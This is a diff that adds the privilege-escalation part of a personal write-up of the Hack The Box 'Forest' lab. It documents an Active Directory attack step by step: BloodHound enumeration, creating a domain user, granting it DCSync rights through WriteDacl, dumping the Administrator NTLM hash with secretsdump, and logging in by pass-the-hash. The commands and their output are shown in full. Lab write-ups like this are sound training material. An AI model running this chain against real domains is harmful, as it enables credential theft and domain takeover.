@@ -246,5 +246,63 @@ $krb5asrep$23$svc-alfresco@HTB:6510e231f7bd073beb207c9c8b0312f1$9ee65c44e5fb88dd
 ## Privesc
 
 - Let's upload winpeas with evil-winrm it is easy we just have to use the upload command `upload /home/kali/Documents/hackthebox/forest/winPEASany.exe`
+- Let's also take powerup
+- This does not really go anywhere.
+- Let's use Bloodhound, after all the box is named "forest"  
 
-**Coming Soon**
+![Bloodhound](../.res/2022-10-07-15-28-00.png)
+
+- This node is particularly interesting for us  
+
+![CanPSRemote](../.res/2022-10-08-17-55-24.png)  
+
+- According to this [article](https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/) we can access to File Shares.
+- `net view FOREST.HTB.LOCAL`
+
+![](../.res/2022-10-08-17-59-05.png)
+
+- `New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)`
+
+- `net group "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco /add /domain`
+- We did not go very far with this.
+- We could also try to abuse this `WriteDacl` permission that the group "Exchange Windows Permissions has"
+- Our user svc-alfresco is able to add users.
+- Here are the Abuse info from bloodhound
+
+>To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges.
+You may need to authenticate to the Domain Controller as a member of EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL if you are not running a process as a member. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):
+
+```dos
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+```
+
+>Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL:
+
+```dos
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
+```
+
+> Once you have granted yourself this privilege, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain
+
+```dos
+lsadump::dcsync /domain:testlab.local /user:Administrator
+```
+
+- First let's import Powerview `. .\Powerview.ps1` was not working what worked was `Import-Module .\PowerView.ps1`
+- Let's add a user `net user gabrielle gabrielle@123 /add /domain`
+- Let's add it to the group with WriteDacl permission `net group "Exchange Windows Permissions" /add gabrielle`
+- `Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity gabrielle -Rights DCSync` we use Add-DomainObjectAcl
+- Finally we just need to dump hashes with secretdumps `secretsdump.py htb.local/gabrielle:gabrielle@123@10.10.10.161`
+- We get the admin hash this way
+
+```bash
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+```
+
+- Let's connect as Administrator using the hash `evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6` and get the root flag `type ../Desktop/root.txt`
